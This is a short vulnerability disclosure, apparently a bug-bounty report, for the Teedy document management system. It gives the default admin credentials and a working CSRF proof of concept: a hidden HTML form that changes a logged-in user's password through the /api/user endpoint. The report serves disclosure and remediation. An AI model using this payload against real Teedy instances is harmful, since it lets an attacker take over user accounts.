# Description

Teedy is a lightweight document management system packed with all the features you can expect from big expensive solutions. It is vulnerable to account takeover with CSRF.

# Proof of Concept

1. Install the package by following these [instructions](https://github.com/sismics/docs#install-with-docker) or try the live demo https://demo.teedy.io
2. Login as admin with credentials `admin:admin`
3. Generate CSRF PoC from burpsuite
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://demo.teedy.io/api/user" method="POST">
      <input type="hidden" name="password" value="hacked123" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
4. Visit the payload URL and click submit button
5. The user's password is changed successfully

# Impact

An attacker is able to takeover any account
